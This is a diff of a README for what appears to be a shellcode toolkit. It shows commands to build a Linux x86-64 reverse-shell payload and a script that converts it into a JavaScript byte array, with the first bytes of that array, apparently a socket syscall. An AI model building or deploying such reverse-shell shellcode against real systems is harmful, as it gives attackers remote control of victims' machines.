@@ -3,14 +3,14 @@
 * build shellcode:
 
 ```shell
-make shellcode SC=linux/reverse64IPv4
+make shellcode T=linux/reverse64IPv4
 
 ```
 
 * build run elf:
 
 ```shell
-make elf
+make run T=linux
 ```
 
 * run shellcode:
@@ -23,7 +23,7 @@ make elf
 
 ```shell
 ╭─ 
-╰─ python s2a.py shellcode
+╰─ python ./tools/s2a.py shellcode
 var JavaScript_shellcode = new Uint8Array([
     0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x00,
     0x5a, 0x6a, 0x29, 0x58, 0x0f, 0x05, 0x48, 0x97,
